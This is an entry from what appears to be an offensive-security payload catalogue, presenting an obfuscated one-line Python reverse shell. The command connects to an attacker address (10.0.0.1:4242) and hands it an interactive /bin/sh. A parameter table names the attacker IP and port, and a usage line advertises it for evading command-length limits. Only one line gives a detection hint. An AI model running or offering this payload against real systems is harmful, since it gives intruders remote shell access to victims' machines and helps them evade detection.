---
id: 3d24016b-87e1-495a-af9c-3b7201cc3442
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - obfuscated
  - subprocess
validated: true
---

# Python-Short-Obfuscated-Reverse-Shell-Subprocess-Fileno

## Code

```python
python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

## Description

Short obfuscated variant with fileno redirects to subprocess.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | Attacker's IPv4 address | 10.0.0.1 |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

Evasion in limited command length scenarios.

## Detection

- Compact aliasing + fileno subprocess.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
